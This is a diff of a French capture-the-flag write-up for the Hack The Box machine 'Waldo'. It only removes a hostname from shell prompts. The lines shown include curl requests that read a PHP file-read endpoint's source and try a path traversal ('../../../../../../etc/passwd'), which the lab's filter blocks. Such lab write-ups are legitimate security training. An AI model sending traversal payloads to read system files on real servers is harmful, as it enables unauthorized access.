@@ -46,7 +46,7 @@ dirRead.php (Fichier pour lire les répértoires) Paramètre : path=<br />
 
 On va plus s'intéréssé au fichier fileRead.php et dirRead.php ils sont beaucoup plus utiles.
 
-    root@seyptoo-Aspire-E5-721:~/htb/writeup/Waldo# curl -s -X POST http://10.10.10.87/fileRead.php -d "file=fileRead.php"|jq -r .file
+    root@:~/htb/writeup/Waldo# curl -s -X POST http://10.10.10.87/fileRead.php -d "file=fileRead.php"|jq -r .file
     <?php
 
 
@@ -67,14 +67,14 @@ On va plus s'intéréssé au fichier fileRead.php et dirRead.php ils sont beauco
     
 Voilà on a réussis à lire le fichier fileRead.php comme pour on peut le voir il y'a du str_replace.
 
-    root@seyptoo-Aspire-E5-721:~/htb/writeup/Waldo# curl -s -X POST http://10.10.10.87/fileRead.php -d "file=../../../../../../etc/passwd"|jq
+    root@:~/htb/writeup/Waldo# curl -s -X POST http://10.10.10.87/fileRead.php -d "file=../../../../../../etc/passwd"|jq
     {
       "file": false
     }
     
 Donc si nous essayons de lire le fichier passwd sur le dossier /etc.
 
-    root@seyptoo-Aspire-E5-721:~/htb/writeup/Waldo# curl -s -X POST http://10.10.10.87/fileRead.php -d "file=../../../../../../etc/passwd"|jq
+    root@:~/htb/writeup/Waldo# curl -s -X POST http://10.10.10.87/fileRead.php -d "file=../../../../../../etc/passwd"|jq
     {
       "file": false
     }
